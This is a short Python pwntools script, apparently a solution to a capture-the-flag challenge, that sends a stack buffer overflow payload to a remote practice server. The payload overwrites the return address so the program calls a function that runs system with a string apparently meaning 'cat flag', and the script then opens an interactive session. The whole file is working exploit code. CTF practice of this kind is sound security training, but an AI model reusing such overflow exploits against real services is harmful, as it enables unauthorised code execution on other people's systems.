from pwn import *
context.arch='i386'

# p = process('./memory')
p = remote('node3.buuoj.cn',27442)

# there are function which contains system and strings 'cat flag', overflow to call it and get flag

payload = 'A'*(0x13+4)
payload += flat([ELF('./memory',checksec=False).sym['win_func'], ELF('./memory',checksec=False).sym['main'], 0x080487E0])
p.sendline(payload)
p.interactive()
